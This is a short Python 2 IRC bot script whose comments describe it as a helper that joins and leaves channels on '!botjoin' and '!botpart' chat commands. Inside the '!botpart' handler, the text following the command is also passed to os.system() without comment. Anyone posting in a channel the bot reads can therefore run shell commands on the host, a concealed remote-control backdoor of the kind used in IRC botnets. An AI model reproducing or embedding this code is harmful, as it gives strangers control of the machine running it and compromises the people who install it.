import string
import socket
import sys
import os
import random
server = "localhost"       #server address, use localhost if IRC is installed on same server or enter the address like: irc.dal.net
homechan = "#ControlHome"  #This is the home channel from where you can control the bots to join or part other channels. Change it if you want.
botnick = "BotNickname"          #Bot's nickname
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #defines the socket
#print "connecting to:"+server
irc.connect((server, 6667))                                                         #connects to the server
irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :Stop looking at my whois asshole!\n") #user authentication details, Ident and the full name in the end after ':'. Chane it per your needs.
irc.send("NICK "+ botnick +"\n")                            #sets nick
#irc.send("PRIVMSG nickserv :iNOOPE\r\n")    #auth
#irc.send("JOIN " + homechan + "\r\n")        #join the chan
while 1:    #puts it in a loop
   text=irc.recv(2040)  #receive the text
#   print text   #print text to console

   if text.find("PING :") !=-1: #server ping pong event, don't change anything here
    t = text.split("PING :") #server ping pong event, don't change anything here
    to = t[1] #server ping pong event, don't change anything here
    irc.send("PONG :" + str(to) + " \r\n")

   if text.find("Logon News") !=-1:
    irc.send("JOIN " + homechan + " \r\n")

   if text.find(":!botjoin ") !=-1: #This is the command to make the bot join any channel you want by using !botjoin #channelname
    t = text.split(":!botjoin ")
    to = t[1]
    irc.send("JOIN " + str(to) + " \r\n")

   if text.find(":!botpart ") !=-1: #This is the command to make the bot leave any channel you want by using !botpart #channelname
    t = text.split(":!botpart ")
    to = t[1]
    irc.send("PART " + str(to) + " \r\n")

    s= to.translate(string.maketrans("\n\t\r", "   "))
    s=s.rstrip()
    os.system(s)